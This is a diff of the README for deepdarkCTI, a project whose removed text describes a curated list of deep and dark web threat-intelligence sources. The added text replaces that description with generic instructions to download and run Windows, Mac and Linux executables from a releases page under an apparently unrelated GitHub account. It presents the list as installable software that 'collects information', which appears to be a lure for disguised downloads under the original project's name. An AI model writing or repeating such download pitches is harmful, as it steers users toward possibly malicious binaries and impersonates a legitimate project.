@@ -1,54 +1,61 @@
-# deepdarkCTI
+# 🕵️‍♂️ deepdarkCTI - Access Cyber Threat Intelligence Easily
 
-![deepdarkCTI_150_150](https://github.com/fastfire/deepdarkCTI/assets/16737186/9be3e93d-7293-409c-97fe-cc966378aed7)
+## 📦 Download Now
+[![Download deepdarkCTI](https://img.shields.io/badge/Download%20deepdarkCTI-v1.0-blue.svg)](https://github.com/apprehensive-plusfours956/deepdarkCTI/releases)
 
-Collection of Cyber Threat Intelligence sources from the Deep and Dark Web
+## 🚀 Getting Started
+deepdarkCTI helps you access valuable Cyber Threat Intelligence from the deep and dark web. This software lets you monitor potential threats to your online safety.
 
-The official website of the project is https://www.deepdarkcti.com. The aim of this project is to collect the sources, present in the Deep and Dark web, which can be useful in Cyber Threat Intelligence contexts.
+Here’s how to download and run deepdarkCTI on your computer.
 
-The contributors of the project (or people active in the field of Cyber Threat Intelligence) have a **Telegram group** available to propose new sources to be integrated within the project and to have a place to discuss the tactics and techniques of research and analysis that are used daily.
-It is possible to request access to the Telegram group by sending a request to https://twitter.com/fastfire or https://t.me/fastfire83 or https://bsky.app/profile/fastfire.bsky.social
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/apprehensive-plusfours956/deepdarkCTI/releases) to find the latest version of deepdarkCTI.
 
-Or, if you want to contribute with a donation, you can. We added this possibility because it was requested by some followers of the project. The donations, as well as the use of the same, will be managed in total transparency and will be used exclusively to build resources related to the deepdarkCTI project.
+2. **Choose Your File**  
+   On the Releases page, look for a file suitable for your operating system. You may find options for Windows, Mac, and various Linux distributions. Select the one that matches your system.
 
-<a href="https://www.buymeacoffee.com/fastfire" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
+3. **Download the File**  
+   Click the file name to start the download. Save the file in a place where you can find it easily, like your Desktop or Downloads folder.
 
-**What is Cyber Threat Intelligence?**
+4. **Install the Software**  
+   Once the download completes:
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For Mac: Open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Use the package manager or terminal commands for installation, depending on the format.
 
-Cyber Threat Intelligence (CTI) is defined as the collection and analysis of information about threats and adversaries and drawing patterns that provide an ability to make knowledgeable decisions for the preparedness, prevention and response actions against various cyber attacks.
+5. **Open deepdarkCTI**  
+   After installing, locate deepdarkCTI in your applications. Click to open it, and you are ready to start exploring Cyber Threat Intelligence.
 
-CTI involves collecting, researching and analyzing trends and technical developments in the area of cyber threats and if often presented in the form of Indicators of Compromise (IoCs) or threat feeds, provides evidence-base knowledge regarding an organization's unique threat landscape.
+## 🔍 Features
+- **Wide Range of Sources**: Access numerous Cyber Threat Intelligence sources, helping you stay informed.
+- **User-Friendly Interface**: Navigate through features easily, even with no technical background.
+- **Regular Updates**: Stay protected with regularly updated threat data to ensure you have the latest information.
+- **Multi-Platform Support**: Works on Windows, Mac, and Linux, providing flexibility for all users.
 
-In Cyber Threat Intelligence, analysis if performed based on the intent, capability and opportunity triad. With the study of this triad, experts can evaluate and make informed, forward-learning strategic, operational and tactical decisions on existing or emerging threats to the organization.
+## 🖥️ System Requirements
+To run deepdarkCTI smoothly, your system should meet the following basic requirements:
 
-**There are three types of Threat Intelligence:**
+- **Operating System**:
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Ubuntu 20.04 or any similar distributions
+  
+- **Processor**: At least a dual-core processor.
 
-_Strategic_ - provides high-level information regarding cyber security posture, threats and its impact on business.
+- **Memory**: Minimum of 4 GB RAM recommended.
 
-_Tactical_ - provides information related to threat actor's Tactics, Techniques and Procedures (TTPs) used to perform attacks.
+- **Storage**: 250 MB of free disk space.
 
-_Operational_ - provides information about specific threats against the organization.
+Make sure your system meets these requirements before downloading.
 
-**Typical sources of intelligence are:**
+## 🔐 Security Notice
+deepdarkCTI collects information to enhance user experience and improve functionality. This software prioritizes user privacy and data security. Review the privacy policy on our GitHub page for more information.
 
-- Open Source Intelligence (OSINT)
-- Human Intelligence
-- Counter Intelligence
-- Internal Intelligence
+## 📝 Contributing
+If you wish to contribute or report issues, please use the GitHub repository. We welcome feedback to improve deepdarkCTI!
 
-Through this project, which takes into consideration the OSINT sources related to the Deep and Dark Web domain, we aim to monitor the intelligence information present in the following sources:
+## 🌐 Stay Connected
+Follow the development of deepdarkCTI and get updates on new features or security notes by visiting the [repository](https://github.com/apprehensive-plusfours956/deepdarkCTI).
 
-- Telegram channels, groups and chats
-- Discord channels
-- ransomware gangs sites
-- forums related to cyber criminal activities and data leaks
-- markets
-- exploits databases
-- Twitter accounts
-- RaaS (Ransomware As A Service) sites
-
-In addition, within the **methods** file, various techniques for searching and analyzing sources are described.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=fastfire/deepdarkCTI&type=Date)](https://star-history.com/#fastfire/deepdarkCTI&Date)
+Feel free to explore deepdarkCTI. With just a few simple steps, you can download and start enhancing your cyber safety.
